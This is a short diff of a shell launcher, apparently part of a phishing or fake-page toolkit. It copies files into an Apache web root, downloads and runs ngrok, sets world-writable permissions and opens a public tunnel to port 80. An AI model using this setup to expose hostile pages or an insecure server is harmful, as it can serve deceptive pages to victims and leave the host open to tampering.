@@ -2,11 +2,7 @@
  cat Launch.txt
 sleep 4
  echo -e "\e[1;31m REQUIREMENT : ROOT! INTERNET! APACHE SERVER! \e[0m" 
- echo -e "\e[1;37m                   Devolopers assume no liability and are not Responsible! \e[0m"
-
-
-
-                                      
+ echo -e "\e[1;37m Devolopers assume no liability and are not Responsible! \e[0m"
 
 
 sleep 6
@@ -59,15 +55,12 @@ echo ""
 		cp -R * /var/www/html/
 		cd ..
 		cd /var/www/html/
-		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-                unzip ngrok-stable-linux-amd64.zip
-                chmod +x *
-		chmod 7777 *
-		sleep 6
-	        echo""
-                echo""
-                echo""
-                gnome-terminal -x bash -c "./ngrok http 80; exec bash"
+		wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+		tar zxvf ./ngrok-v3-stable-linux-amd64.tgz
+		chmod +x *
+		chmod 777 *
+		gnome-terminal -x bash -c "./ngrok config add-authtoken <your_token_here>"
+		gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                 echo ""
                 echo ""
                 echo ""
